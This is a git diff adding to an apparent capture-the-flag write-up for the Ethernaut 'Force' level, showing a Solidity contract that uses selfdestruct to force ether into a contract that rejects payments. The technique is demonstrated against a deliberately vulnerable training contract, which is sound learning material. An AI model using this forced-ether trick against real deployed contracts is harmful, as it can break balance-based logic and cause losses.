@@ -23,3 +23,28 @@ Challenge's message.
 
 > Some contracts will simply not take your money ¯\_(ツ)_/¯
 The goal of this level is to make the balance of the contract greater than zero.
+
+Our aim should be send ether to target contract to solve this challenge.
+
+## Subverting
+
+My attack contract.
+
+```solidity
+pragma solidity ^0.8.0;
+
+contract Attack{
+
+    address payable target;
+
+    constructor(address payable _target){
+        target = _target;
+    }
+
+    function attack()public payable{
+        selfdestruct(target);
+    }
+}
+```
+
+In the starting point, identify the contart address which is our target. Afterwards, send ether to target contract with ```selfdestruct()``` method. With help of selfdestruct, contracts can be deleted from the blockchain.
